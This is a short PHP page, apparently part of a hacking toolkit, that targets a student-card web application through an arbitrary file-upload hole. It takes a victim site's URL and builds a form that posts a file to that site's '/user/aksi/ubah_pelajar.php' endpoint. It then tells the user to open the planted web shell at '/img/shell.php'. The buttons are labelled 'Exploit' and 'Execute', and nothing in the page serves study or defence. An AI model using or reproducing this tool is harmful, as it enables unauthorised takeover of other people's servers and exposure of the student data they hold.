<?php
$judul=@Aplikasi_Kartu_Pelajar_AFU;
error_reporting(0);
?>
<div class="container">
  <div class="row">
  <div class="col">
  <div class="card">
    <div class="card-header"><p><?php echo str_replace("_", " ", "$judul"); ?></p></div>
    <div class="card-body">
      <div class="table-responsive">
<form method="post"><center>
<input type="url" name="url" size="50" height="10" placeholder="https://onedetermination.com" class="form-control text-primary" autocomplete="off" required>
<br>
<br>
<input type="submit" name="d" value="Exploit" class="btn btn-outline-primary">
		<br>
</center></form>
<?php
$url = $_POST['url'];
$d = $_POST['d'];
$url =htmlspecialchars($url);
if($d) {
    echo "<br><center><form method='post' target='_blank' action='$url/user/aksi/ubah_pelajar.php' enctype='multipart/form-data' ><br>
    <p class='text-success'>UpFile</p>
<input type='file' name='gambar'/><br>
<input type='submit' name='d' value='Execute' class='btn btn-outline-primary' ></form><br><p class='text-danger'>Akses Setelah Upload : $url/img/shell.php</center>"; 
}
?>